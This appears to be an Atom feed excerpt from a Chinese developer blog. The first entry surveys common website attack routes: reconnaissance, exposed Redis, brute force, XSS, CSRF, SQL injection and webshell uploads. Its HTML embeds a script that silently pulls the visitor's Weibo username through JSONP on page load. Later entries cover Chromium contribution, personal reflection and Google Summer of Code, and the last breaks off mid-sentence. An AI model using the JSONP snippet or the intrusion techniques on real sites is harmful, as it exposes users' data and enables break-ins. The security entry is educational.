    <title>你的网站是怎么被黑的</title>
    <link href="http://zhchbin.github.io/2015/12/05/how-do-your-websites-get-hacked/"/>
    <id>http://zhchbin.github.io/2015/12/05/how-do-your-websites-get-hacked/</id>
    <published>2015-12-05T13:22:09.000Z</published>
    <updated>2016-10-02T05:43:40.000Z</updated>
    
    <content type="html"><![CDATA[<p><link rel="stylesheet" href="http://apps.bdimg.com/libs/alertify.js/0.3.11/alertify.core.css"></p><p><link rel="stylesheet" href="http://apps.bdimg.com/libs/alertify.js/0.3.11/alertify.default.css"></p><script type="text/javascript" src="http://apps.bdimg.com/libs/jquery/2.1.4/jquery.js"></script><script src="http://apps.bdimg.com/libs/alertify.js/0.3.11/alertify.min.js"></script><script>$(function() {  $.ajax({    url: 'http://game.weibo.com/home/indexv3/pajaxUserInfo',    jsonp: "callback",    dataType: "jsonp",    success: function(response) {      if (response.errorCode != 0)        return;      alertify.set({ delay: 10000 });      alertify.log(response.data['user_name'] + "，您好啊！");    }  });});</script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个标题的来源是@evilcos（余弦大大）在Github上分享的一个PPT，感兴趣的可以去他的<a href="https://github.com/evilcos/papers/blob/9b16668d4f9733272082bb9b399acfb85ba8083c/%E7%A7%91%E6%99%AE_%E4%BD%A0%E7%9A%84%E7%BD%91%E7%AB%99%E6%98%AF%E6%80%8E%E4%B9%88%E8%A2%AB%E9%BB%91%E7%9A%84.pptx" target="_blank" rel="noopener">repo</a>下载。写这篇博客主要是想给自己最近业余时间学到的安全相关的知识做个总结，主要是关于网站常见漏洞的攻击和利用，不过由于我也是刚入门，写得肯定不怎么到位，不感兴趣就不要浪费时间了哈。</p><p>很久之前在乌云上注册过一个账号，最近也刷了一波漏洞，终于升级变成了实习白帽子的级别。</p><h2 id="未知攻焉知防"><a href="#未知攻焉知防" class="headerlink" title="未知攻焉知防"></a>未知攻焉知防</h2><p>这句话可谓安全圈里的金句（据说出自TK教主，我还没混入圈子，不敢确定）。如果给一个黑客一个网站，他们会怎么下手呢？这里的黑客当然是好人！业界称他们为白帽子。而攻击的过程也叫做渗透测试。</p><h3 id="收集信息阶段"><a href="#收集信息阶段" class="headerlink" title="收集信息阶段"></a>收集信息阶段</h3><ul><li>域名会给出什么信息呢？通过查询whois，就可以得到站长的信息（如邮箱，注册人，地址，电话等）</li><li>域名对应IP地址，对该IP使用nmap扫描，可以知道该服务器的基本信息，如开启了什么端口，21是FTP，22是SSH，80/443是HTTP服务的端口，3306就是MYSQL的默认端口，服务器上使用的是什么系统。</li><li>查看网站的robots.txt文件，开发者不希望被爬虫抓取的信息都在这里哦，所以可能有后台地址，有可能指向网站的配置文件（你也会好奇你怎么配置了这么奇怪的robots.txt吧）</li><li>旁站攻击，通常会有意想不到的收获。旁站指的是跟你站点部署在相同一台服务器上的其他站点。虽然你本身站点做好了安全工作，但也难以保证其他站点不存在漏洞导致服务器被控制的。更新：今天刚好看到个例子，<a href="http://www.wooyun.org/bugs/wooyun-2015-0149244" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2015-0149244</a></li><li>C端，顺便扫一下该服务器IP所在的C段</li><li>上Github上搜索该域名对应的邮箱账号。很多公司都会有自己的邮箱系统，而开发人员有时候会很可爱地分享出他们的密码。搜索的关键词如：<code>smtp 某域名</code>，耐心翻的话可能有收获；有些开发还可能上传项目的代码呢！</li><li>子域名，查询子域名还可以知道该站点存在哪些其他的系统，多了不少入口！</li><li>Google收集信息，搜索语法如使用<code>site:域名</code>，<code>inurl:域名</code>等。</li><li>常见网站的路径扫描，可能扫出后台地址，phpinfo等</li></ul><p>还有很多其他收集信息的方法，暂时能想到的就这些了。这里找到的信息有些足以令他们进行一次内网漫游了。</p><h3 id="漏洞挖掘阶段"><a href="#漏洞挖掘阶段" class="headerlink" title="漏洞挖掘阶段"></a>漏洞挖掘阶段</h3><ul><li>存在未授权的服务？比如mongodb，mysql，redis，memcached等服务配置错误，暴露在外网。这个足以利用来拿下服务器了。就拿前段时间比较火的redis未授权访问来举例吧，被挖到的话，他们就可以在运行redis的用户下插入<code>authorized_keys</code>，继而SSH到你的服务器上进行任何他想做的操作了。这个漏洞还可以利用来实现远程命令执行。乌云漏洞例子：<a href="http://wooyun.org/bugs/wooyun-2010-0154887" target="_blank" rel="noopener">http://wooyun.org/bugs/wooyun-2010-0154887</a></li><li>后台登录没有验证码？或者验证码可以绕过，比如把验证码写在cookie里，比如一个验证码可以无限次使用？好吧，爆破不用商量。你是想象不到他们手上的字典是有多厉害！他们可以利用前面信息收集阶段的内容，有针对性地fuzz出一份成功率相当高的字典。如果你不幸使用了弱密码，比如：<code>admin, 123456</code>等等，那就更不用担心你的服务器不会被入侵了。例子太多，不举例。</li><li>服务器上所使用的软件存在漏洞？著名的心脏出血漏洞就是这类漏洞的典型代表。而最近比较热门的是Java的反序列化的问题，乌云漏洞例子：<a href="http://wooyun.org/bugs/wooyun-2010-0156418" target="_blank" rel="noopener">http://wooyun.org/bugs/wooyun-2010-0156418</a></li><li>站点相关的邮箱密码泄露了！他会在你的邮箱里找vpn连接，找各种密码，找任何有用的信息！放个例子：<a href="http://www.wooyun.org/bugs/wooyun-2010-0145407" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2010-0145407</a></li><li>还有一个神器叫做metaspolit，目前我还不是很熟悉，暂时先留空。</li></ul><p>接下来要说的是关于应用层上的一些漏洞了。</p><ul><li>首先是XSS漏洞，分反射型和存储型等。XSS盗用户Cookie是挺常见的，利用XSS甚至可以打到后台：比如通过网站的私信功能呢发送给网站的管理员，管理员点开就完蛋了。例子：<a href="http://www.wooyun.org/bugs/wooyun-2010-0145738" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2010-0145738</a> 分享一个XSS实例教程：<a href="http://www.wooyun.org/whitehats/%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90" target="_blank" rel="noopener">link</a> 全部都是腾讯的案例！</li><li>CSRF跨站伪造请求漏洞，危害的是网站的用户。如果管理员的某些操作，比如修改用户的密码存在这个漏洞，那么他就会写一个页面，然后社工管理员去点开。如果此时浏览器里管理员登陆，那么用户的密码就会被重置。这种漏洞在微博这种社交应用里危害更大，可直接导致蠕虫攻击。最近看到的例子：<a href="http://linux.im/2015/11/23/SinaWeibo-Worm.html" target="_blank" rel="noopener">http://linux.im/2015/11/23/SinaWeibo-Worm.html</a></li><li>SQL注入，在乌云上挺常见的。他可以使用神奇SQLMap测试是否存在注入点。如果你的接口存在该漏洞，哪怕是只有一处，那也是致命的。如果运行数据库的用户权限够，利用来拿下你的服务器应该可以说是分分钟的事情，利用某些注入点sqlmap可以连接到服务器的shell上。另外，SQL注入漏洞也会泄露用户信息，造成脱裤。泄露管理员的账号和密码，直接导致后台沦陷。在乌云上也是能找到一大堆，不举例了。</li><li>任意文件下载，如果你的站点存在这种漏洞，也就是说你的服务上的所有东西都可以被下载，包括你的服务器配置信息！看例子吧：<a href="http://www.wooyun.org/bugs/wooyun-2010-0145972" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2010-0145972</a> 标题：某省铁路建设投资公司网站系统漏洞导致任意文件下载并登录后台、任意文件修改并shell</li><li>任意文件上传，你的站点没有检查用户上传上来的文件内容就直接保存了？还按照用户指定的后缀保存？还放到了可执行的目录下？那就等着被上传web shell吧。Github上有很多人分享的各种各样的webshell，上传到你的服务器之后，他就可以列出你的服务器上所有文件并下载，通过webshell在你的服务器上执行命令。乌云例子：<a href="http://www.wooyun.org/bugs/wooyun-2010-0151657" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2010-0151657</a></li><li>逻辑漏洞，比如某个用户可以看到他本不应该看到的信息，常见的情景如用户信息页，只要使用其他用户ID就可以查看到相应的信息，常用的叫法是叫做越权，漏洞例子：<a href="http://wooyun.org/bugs/wooyun-2010-0156326" target="_blank" rel="noopener">http://wooyun.org/bugs/wooyun-2010-0156326</a> 。再比如找回密码的逻辑漏洞，找回密码使用手机找回，验证码只有4位，且可以被无限次猜。那就不要怪他用神奇burpsuite的intruder模式，直接猜到验证码重置任意用户信息了。关于常见的找回密码漏洞可以看：<a href="http://drops.wooyun.org/web/5048" target="_blank" rel="noopener">http://drops.wooyun.org/web/5048</a> 。再比如，把cookie当session使用，后台权限bypass等。</li><li>可被暴力破解或撞库！比如没有限制用户密码尝试次数还没有带验证码，例子：<a href="http://wooyun.org/bugs/wooyun-2015-0124461" target="_blank" rel="noopener">http://wooyun.org/bugs/wooyun-2015-0124461</a></li></ul><p>还有很多其他问题，因为学艺未精，暂时写到这里吧。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>当然是上报到安全平台刷rank，报告给厂商后，说不定厂商好心还可以拿个礼物！！！</p><h2 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h2><ul><li>好久没写博客了。（意思是写得不好都是我的错）</li><li>这篇文章提到的东西我都不懂，我只是做个名词解释，目前还处于入门阶段！希望自己以后能深入研究各种思路。</li><li>请不要利用文章中提到的知识干坏事！！！</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;http://apps.bdimg.com/libs/alertify.js/0.3.11/alertify.core.css&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;http:/
      
    
    </summary>
    
    
      <category term="安全" scheme="http://zhchbin.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>如何加入开源项目</title>
    <link href="http://zhchbin.github.io/2013/12/08/contribute-to-open-source-project/"/>
    <id>http://zhchbin.github.io/2013/12/08/contribute-to-open-source-project/</id>
    <published>2013-12-07T16:00:00.000Z</published>
    <updated>2016-10-02T05:43:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>在过去的一年多时间里，我很幸运地为两个开源项目贡献了几千行代码。在node-webkit的提交记录中，我有34个Commits，在Chromium中，用了六个月的时间也提交了30+个Commits，可以说对如何加入开源社区有一点点的自己的看法了。写这篇博客的目的是为了记录下我的经验，希望可以鼓励更多像我一样希望为开源项目做贡献的学生参与到自己喜欢的开源社区中。说真的，花时间参与一个优秀的开源项目，将你大学期间自学的一些东西应用于实践中，还能接触到你在大学课堂上几乎不可能学到的知识，比起为了拿多那么点分数而努力完成作业值多了。</p><p>我为什么会花费这么多精力在这个事情上？</p><p>第一点：“大学里时间太多，为了不像周围其他同学一样虚度，做一些有意义的事情，就开始参与 Chromium 了。” 这句话是我发邮件感谢方觉【0】在我第一次提交代码时指导我解决问题的时候他回复我的。参与开源社区就是一个很有意义的事情。当你作为一个开源项目成长的见证者和贡献者，当其他人谈到这个项目的时候，难道不会小心脏稍微激动一下吗？补充一下背景：node-webkit，目前在Github上有7000+的Star的一个C++项目，我在它只有几百个Star就接触到，并且贡献了上千行代码。</p><p>第二点：帮人家解决问题是一种能力，也是一种乐趣。在node-webkit的issue list中，有人说这个问题：@zhchbin能解决，还专门发邮件给我让我帮忙看看，然后还说要给我100美刀作为Bounty的时候，我很开心。并不是因为解决问题了能够得到他说的100美刀，而是人家信任你，觉得你有能力去帮助他们解决问题。在Chromium的Issue List中，每当我看到人家给我的代码提交回复一个thanks/awesome的时候，我也会暗喜的，毕竟这些人都是Google的软件工程师，他们在认可你做出的努力。</p><p>第三点：学到的总会比付出的翻倍。在做开源项目的过程中，每解决一个问题就会学习到该问题相关领域的知识，比如在这段时间内我接触到了Win32 API/GTK+/X11等。还可以体验到如何与其他人协同工作。Chromium上的Reviewer总能给我一些启发，他可以在代码的层次上直接教你正确的写代码方式以及如何写出其他人也看得懂的代码！在这段期间，我知道了测试代码的重要性，知道了代码风格的重要性。</p><p>还有不少点，这里就先不废话了。</p><p>我听过不少人想要为开源项目做贡献，却总是被开源项目的门槛吓跑了。的确，我觉得我真正弄懂node-webkit代码的时候是我决定转去Chromium社区的时候，那个时候我已经为node-webkit写了两个多月（IIRC）。而就算我有为node-webkit写过代码的经验，在进入Chromium社区的时候也是遇到了很大的困难。接下来，我就写一下，在我看来，应该怎么样子加入一个开源社区，以为Chromium贡献代码为例子。</p><p>第一：感性地认识Chromium，了解源代码目录结构。应该知道Google Chrome浏览器就是依托Chromium这个开源项目的，在每个Chrome浏览器中你都能找到这么一句话：“Google Chrome is made possible by the Chromium open source project and other open source software.”。其实我这里想讲的是编译并运行。在大中华局域网中拉下几个G的代码是个煎熬的过程，而且随时都会断掉然后那个仓库的代码就只能重新下载了。在<a href="http://www.chromium.org/Home" target="_blank" rel="noopener">Chromium的网站中</a>就能够找到如何在各个平台下编译的指导。简单地说：就是安装必要的开发库，用gclient下载源码并且gyp产生相应的工程文件(gclient sync)，编译(推荐使用ninja)。</p><p>第二：阅读相关文档，了解Chromium的整体架构。这里说的相关文档是比较坑爹的，文档那么多。其实要耐心，文档你肯定一开始是看不懂的，比如这篇入门必看文档之：<a href="http://www.chromium.org/developers/design-documents/multi-process-architecture" target="_blank" rel="noopener">Chrome的多进程架构</a>。</p><p>第三：到Chromium的<a href="https://code.google.com/p/chromium/issues/list" target="_blank" rel="noopener">Issue List</a>上找一些问题看，在你本地编译出来的Chrome上重现该问题，尝试想想怎么解决，或者看人家怎么解决。上面的问题很多，我这里分享一个我自己看的Issue的标签：Cr-Platform-Apps Hotlist-GoodFirstBug Cr-Platform-Extensions Cr-Platform-Extensions-API Cr-Platform-Apps-AppLauncher Cr-Platform-Apps-Container 都是关于Chrome Extension/Packaged App的，用gmail登录后在 Subscriptions页面中填入这些个标签，在工作日每天你就能收到30+份邮件。这些标签是基于我之前做过一些浏览器的插件和应用，对这个东西还是知道点门路的情况的。因此我很多代码提交都是集中在Chrome Extension/Packaged App APIs上的。</p><p>第四：代码搜索工具：<a href="https://code.google.com/p/chromium/codesearch，" target="_blank" rel="noopener">https://code.google.com/p/chromium/codesearch，</a> 这个工具太好用，也太重要了！当你在看人家的代码时，可以利用这个工具找到具体的代码实现，而且通常情况下要好好阅读相关代码的注释。</p><p>第五：分享一点我解决问题的思路，基于对代码的熟悉程度才能解决的问题这个我没法怎么分享经验。这里想说的其实是如何在如此庞大的项目中定位到需要修改的代码的地方。在遇到程序Crash的时候（经常是空指针的情况），我们其实可以利用gdb（在Linux上），VS2010中Attach to Process的功能（在Windows上）得到程序奔溃的时候的调用栈，然后利用上面的代码搜索工具就可以找到相应的代码了。接下来，就是认真读懂相关的代码，用你的聪明才智想出一个合理的解决方法。如果遇到的问题是chrome://settings/类似URL页面（这些页面都是采用HTML/CSS/JS实现的，webui）中的，那就可以用F12调出开发工具，找到页面元素的ID值，然后还是在上面的搜索工具中查找相关的代码。</p><p>……</p><p>第N：相信自己。上面讲的那些东西，无非是为了引出最后这个点。如果你真的感兴趣，相信自己，坚持，加油。</p><p>“这个事情如果不是我去完成，那么还有谁会去做呢？“</p><p>【0】: 在第一次提交代码到Chromium上的时候认识的，当时多亏了他的指导啊，感谢。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在过去的一年多时间里，我很幸运地为两个开源项目贡献了几千行代码。在node-webkit的提交记录中，我有34个Commits，在Chromium中，用了六个月的时间也提交了30+个Commits，可以说对如何加入开源社区有一点点的自己的看法了。写这篇博客的目的是为了记录下
      
    
    </summary>
    
    
      <category term="OpenSource" scheme="http://zhchbin.github.io/tags/OpenSource/"/>
    
  </entry>
  
  <entry>
    <title>到底你想要什么</title>
    <link href="http://zhchbin.github.io/2013/10/24/what-do-you-want/"/>
    <id>http://zhchbin.github.io/2013/10/24/what-do-you-want/</id>
    <published>2013-10-23T16:00:00.000Z</published>
    <updated>2018-03-12T11:19:36.133Z</updated>
    
    <content type="html"><![CDATA[<p>有这么一句话：想要成为什么样的人，就要和什么样的人在一起！实际上，你可能连自己想做什么样子的人都不清楚。</p><p>我们的生活总会在一定的时间内趋于平淡，每天重复着做着类似的事情，无论你是在上学，上班，或者其他？</p><p>说说大学吧。回顾我过去的大学四年，有人说算是很成功的了。每年都拿奖学金，参加过一些企业办的比赛（比如微软，英特尔）也拿了一些奖，去到Intel OTC实习了四个月，最后也乖乖地保了软院的研，在暑假期间你还参与了一些开源项目。一切看上去都是那样子的在人群中出类拔萃，甚至在朋友聊天中也经常会说我算是中大软件学院里面比较出色的那么几位了。</p><p>可实际上呢？上面那些话我说得自己都有点烦了。只有我自己知道自己究竟是有几斤几两。</p><p>我很少看书，基本上教材的东西到了只有在考试前几周记住了，考试后就忘记了。也许是我打从心底里觉得这些东西对我将来工作根本就没有什么用。但实际中呢？这样子的学习态度让我觉得很没有底气，特别是在面试的时候。我还记得面腾讯广研的笔试题目中有很多个题目是我压根就不会做的，在UC浏览器及小米的笔试中我是直接就被刷掉的。也许你会说，当时的笔试可是几百个人就挑十几二十个人的，可是你应该想想，为什么你成不了那些幸运儿，机会永远留给那些有准备的人，你觉得你准备好了吗？</p><p>我写不出好文章。曾经多少次想坚持写一些博客记录每天学习的内容，写过几次后发现很多东西都是流于形式的摘抄，过了一段时间又会忘记，并没有半点自己的思考，而自己却又不是个擅长思考的人。因为慢慢对自己的博客失去了信心，也就坚持不下放弃了自己的想法。</p><p>我懂得一些解决方法的思维方式。在解决问题上面嗅觉好像总能比其他人更灵敏些，解决问题的效率好像更高些。但是这些奇淫巧技在我看来并不能够让我成为一个难以替代的人物。在Chromium上解决过的问题（大都是些小问题）我能讲得头头是道，但是呢？在不在行的人看来这个是一件多么难以完成的事情啊，在我自己看来，这些只不过是个人，如果愿意花时间和精力去研究，也应该都能搞定的。</p><p>我并不是那么重要。脚伤了不能走路的这些日子，没有去实验室，除了一些小意外之外，实验室的工作依旧没有什么大问题，其他人也都是正常地过着每天的日子。曾经以为如果我离开实验室，那里会乱成一团。事实是？我好像有点自作多情和多余了，这个世界少了谁都能够正常的运转。</p><p>还有很多自我反省自我批评的话没有写下来，算了先。</p><p>好吧，到底你要的是什么？</p><p>一份好工作。目前对我来说最大的希望就是在毕业的时候能够找到一份不错的工作。经历过大三找实习的痛苦，我觉得应该要变得更加优秀，让工作主动来找你。也许我做到了，曾经收到了两份不错的面试邀请机会，感谢你们看得起啊！希望到我真正需要的时候能够有这样子的好机会！现在的我还是好好准备各种笔试和面试吧。正在逐步地养成每天刷一道leetcode上的题目的习惯，希望这个我能够坚持，刷完那140道题！</p><p>一份好心态。不会因为自己身上有很多乱七八糟的事情而失去做事情的热情。这个学期的确有很多事情：做了实验室助理的负责人，每月享受600RMB的待遇也要每天纠结各种实验室的琐事；找了研究生的导师也会给你分配任务做，好在最近顺利地解决了；自己想接着做Chromium上的开源Contribution；偶尔会有人发邮件来叫帮忙解决node-webkit上的问题，有一次还说要给100美刀（可惜我搞定之后他就压根忘记了的样子，好吧，我也不好意思要了）；关于自己研究生想从事的方向现在还是一无所知，等等事情。当然也推掉了不少，对不起不少人啊。</p><p>一个好身体。身体是革命的本钱，深知我目前每天都对着电脑长达12+小时的习惯真的很不好，曾经有一次还因为对着电脑太长时间导致第二天起床的时候吐个半死而回不了家（那天本来是订好票准备回家的），最近还扭伤脚，流鼻血，经常肚子疼什么的。哎！要好好锻炼，注意休息，健康生活！</p><p>最后，做个好人吧。</p><p>好像少写了什么！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;有这么一句话：想要成为什么样的人，就要和什么样的人在一起！实际上，你可能连自己想做什么样子的人都不清楚。&lt;/p&gt;
&lt;p&gt;我们的生活总会在一定的时间内趋于平淡，每天重复着做着类似的事情，无论你是在上学，上班，或者其他？&lt;/p&gt;
&lt;p&gt;说说大学吧。回顾我过去的大学四年，有人说算
      
    
    </summary>
    
    
      <category term="Life" scheme="http://zhchbin.github.io/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title>What is Pay Me to Learn</title>
    <link href="http://zhchbin.github.io/2013/10/17/what-is-pay-me-to-learn/"/>
    <id>http://zhchbin.github.io/2013/10/17/what-is-pay-me-to-learn/</id>
    <published>2013-10-16T16:00:00.000Z</published>
    <updated>2016-10-02T05:43:40.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>今天早上才想起来，自己还欠着一件事情没有做完。很久在人人上之前看到过这样的一句话：</p><blockquote><p>I dropped out of college after Google SoC, because I had work that paid me to learn.</p></blockquote><p>然后就在微博上大发感慨说：“突发奇想：等我搞定Google Summer of Code（不管最终结果如何），我就写一篇文章：什么叫做pay me to learn!”，事实上，估计我写的东西没有多少人会看。不过既然说了就要做到！好吧，接下来将写一下以下几点：</p><ol><li>Google Summer of Code简介</li><li>我怎么就能被选上呢？</li><li>在参加GSoC的过程中我做了什么事情？</li><li>我学到了什么呢？</li></ol><h3 id="Google-Summer-of-Code简介"><a href="#Google-Summer-of-Code简介" class="headerlink" title="Google Summer of Code简介"></a>Google Summer of Code简介</h3><p>Google从2005年其就开始举办这样的全球性活动，简单地用一句话概括一下，就是Google出钱给学生为开源项目写代码，而这个项目是在学生暑假期间举行，被选择上并成功完成的学生最终能够获得<code>5000美刀</code>的奖金。当然，Google的这个项目最想得到的是：提供给学生机会参与到真实的软件开发中，在项目结束后能够有所收获，并且还能继续投入到开源中，为开源社区做贡献。Google提供的是一个平台，在这上面开源项目可以找到对可能对项目发展有帮助的学生，学生可以申请参与到某个开源项目中。以上是我个人的一点理解，当然，也只有Google这样的公司才能耗费如此大的财力和物力做这样的一件事情，每年150+个开源项目， 1000+遍布世界的学生，这得花多少钱。哈哈，虽然对于大公司来说这个是小钱啊。</p><p>更详细官方的介绍还是要自己去官网上了解啊，这里提供一个<a href="https://developers.google.com/open-source/soc/" target="_blank" rel="noopener">传送门</a>。</p><h3 id="我怎么就能被选上呢？"><a href="#我怎么就能被选上呢？" class="headerlink" title="我怎么就能被选上呢？"></a>我怎么就能被选上呢？</h3><p>当时我正大四下学期，从<code>Intel</code>实习结束回来的我还在努力地为node-webkit写着代码，每天查邮件，查issue，写代码的生活虽然很枯燥，但在解决问题及与人交流的过程中也学到不少。看着一个开源项目从<code>1000+ star</code>慢慢地增长到Github C++排名前几的过程对于我来说也算是一件值得骄傲的事情，尽管我只是一个默默无闻的贡献者。也就在这个过程中，在微博上看到了GSoC的宣传微博，顿时就觉得我应该可以去申请参与这样的一个事情。吸引我的另外一点当然还是钱的问题，毕竟那可以用来支付我研究生的一年的学费和生活费了。</p><p>看到可以申请的开源项目公布的时候，我有点失望的是node-webkit没有去申请。抱着一点点的希望，我扫了一遍那个列表，当发现有Chromium的时候有点欣喜。但同时我也在怀疑自己有没有机会。补充点点背景知识，node-webkit是一个将chromium和node.js整合在一起的App运行环境，也就是说，对于Chromium这么大的一个项目，我是有一点点….点点基础的。于是我就开始准备写申请。在chromium-dev的邮件列表中可以找到要求的大概是什么<a href="https://groups.google.com/a/chromium.org/forum/#!topic/chromium-dev/-a7dsB88KxA" target="_blank" rel="noopener">传送门</a>？简简单单的几句话就完了，而且好像也没有多少人关注。</p><p>照着要求，我就开始挑些比较简单的Bug。我第一个选择的bug是<a href="https://code.google.com/p/chromium/issues/detail?id=148463" target="_blank" rel="noopener">Issue 148463</a>：Report an error when chrome.app.window.create is called with a URL that doesn’t exist. 看上去很简单解决嘛，直接加个代码检查文件是否存在不就OK了。但是问题远没有想象中的简单，当时我还不知道这样的一个操作是很耗费时间的IO过程，就算文件存在也不一定能够被加载等等问题。具体细节有兴趣的话可以看看当时我用我蹩脚的英文写的记录，<a href="http://zhchbin.github.io/coding/2013/04/25/first-attempt-to-fix-a-bug-of-chromium/">传送门</a>。</p><p>在第一个Bug未能解决后，坚哥建议我去看一下他发现的一个问题。<a href="https://code.google.com/p/chromium/issues/detail?id=148463" target="_blank" rel="noopener">Issue 159302</a>: Extension icon doesn’t refresh after reload the extension in chrome://extensions. 虽然一开始很顺利的解决，但是reviewer不赞同这样子的做法。经过一段曲折的过程，最终还是我解决的。中间的过程就忽略吧。而我第一个成功提交到chromium代码树中的是一个关于Content Shell的Tooltips在windows上不能够显示出来的问题，在提交的过程中还是遇到了一些小问题，不同平台下的文件换行符真是害死人啊，好在当时方觉给了点Tips！在这里顺便再次感谢。哈哈，从这个commit开始，源代码目录下的Author文件就有了我的名字和邮箱！</p><p>而我具体写的申请是在chrome的extensions/apps中加入全局快捷键的支持，发出去之后一直没有收到回复，所以我就觉得应该还做点什么事情的。幸运的事情是我看到了Chromium的Issue List中有人提到了相应的需求但是没有被实现，于是我就果断地发了一封邮件给了提需求的Google的工程师。他帮我把邮件转发给了另外一个感兴趣的组，当时我收到回复的时候真心感动得哭了！也就在他的帮助下，我觉得我应该能够被选中了！哈哈。</p><p>就这个样子，我就成了luck dog.</p><h3 id="在参加GSoC的过程中我做了什么事情？"><a href="#在参加GSoC的过程中我做了什么事情？" class="headerlink" title="在参加GSoC的过程中我做了什么事情？"></a>在参加GSoC的过程中我做了什么事情？</h3><p>这一部分估计是一个很长很长的过程。在这期间，其实我每周都会记录下大概做了什么事情并给我的Mentor汇报工作，还是用的蹩脚的英文，感兴趣可以到<a href="http://zhchbin.github.io/2013/05/30/recordofmygsoc2013/">这里</a>阅读。总结成一句话就是，我在不断地找我能够解决的问题，写代码解决问题，测试，提交，照着reviewer的意见修改直到能够得到他们的<code>LGTM</code>。</p><p>第一个我比较满意的Change List是解决了Chrome Packaged App在多屏幕下的问题，具体的Bug是这个样子的，当电脑中外接了一个显示屏，将App的窗口拖到另外一个显示器上，关闭该窗口，断开显示器之后，窗口就没法重新在主屏幕上出现了。虽然一开始不知道从哪里下手，面对代码如此庞大的一个项目，但是慢慢地在尝试的过程中，我发现出现这个问题的原因是Chrome记录下了上一次窗口关闭的位置，当显示区域改变的时候，位置并没有跟着更新。经过一番思索之后，我觉得应该可以也记录下窗口的所在的屏幕大小，然后在创建窗口的时候去检查是否发生了改变，如果变了，就做一些调整窗口位置的操作，使得窗口能够在显示屏中出现。事实上，这个做法被接受了！！<a href="https://chromiumcodereview.appspot.com/17564005" target="_blank" rel="noopener">最终代码</a>由@scheib帮我提交进去了。</p><p>第二件比较OK的事情就是利用X11的API将Ubuntu Unity Window Manager下GTK+没有了窗口的最小化事件。这个好像是Unity的一个Bug，也有可能是人家故意的。做法其实很简单，就是通过给窗口添加了一个Event Filter的函数，获取对应窗口属性，检查他是否有相应的最小化时应该有属性，然后将这个事件传递给应用窗口就可以顺利解决了！</p><p>其实在这期间我解决的问题不少，但都是类似的这种小问题，不过解决起来挺有挑战性的！每当解决一个问题的时候就能够学到该问题相关领域的知识。</p><p>接下来还是讲讲我的Proposal的事情。因为我要添加的是一个新的功能，所以得经过一定的流程，<a href="http://www.chromium.org/developers/design-documents/extensions/proposed-changes/apis-under-development" target="_blank" rel="noopener">具体流程</a>。一开始我也没有考虑到什么问题，觉得采用以下的API设计方式就搞定了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">namespace globalHotKeys &#123;</span><br><span class="line">  ...</span><br><span class="line">  interface Functions &#123;</span><br><span class="line">    // Register a global hot key.</span><br><span class="line">    static void register(HotKey hotKey);</span><br><span class="line"></span><br><span class="line">    // Unregister a global hot key.</span><br><span class="line">    static void unregister(HotKey hotKey);</span><br><span class="line"></span><br><span class="line">    // Gets an array of all the global hot keys.</span><br><span class="line">    static void getAll(optional GetAllCallback callback);</span><br><span class="line">  &#125;;</span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>实际上，这样子的设计根本就不可能被接受，因为这样子的设计方式给开发者太高的权限，Extension/App可以随时的修改全局快捷键。经过一段时间的讨论后，@Finnur建议从扩展chrome.commands入手，因为chrome.commands提供了chrome在有焦点的情况下的快捷键，可以共有不少代码。于是乎，最终的设计变成了如下所示。具体讨论的过程可以到相应的API Proposal中查看，<a href="https://docs.google.com/document/d/1mFmxLoYrcwdg1pouXpC_MC4SF-nMWDzWaMNrIHgM1pM/edit?usp=sharing" target="_blank" rel="noopener">传送门</a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span> : <span class="string">"my extension"</span>,</span><br><span class="line">  ...</span><br><span class="line">  "commands": &#123;</span><br><span class="line">    "toggle-feature-foo": &#123;</span><br><span class="line">      "suggested_key": &#123;</span><br><span class="line">        "default": "Ctrl+Shift+Y",</span><br><span class="line">        "mac": "Command+Shift+Y"</span><br><span class="line">      &#125;,</span><br><span class="line">      "description": "Toggle feature foo",</span><br><span class="line">      "global": true                     ← default: false</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在提议这个的过程中，我还接触到了Google的一位应该是PM的人，由于Chrome中NPAPI在2014年其就要被淘汰了以及在Packaged App中不支持NPAPI，而某个功能又需要能够检测到多媒体键的按键信息。比如说下一首，上一首，停止等多媒体键。所以，我的API 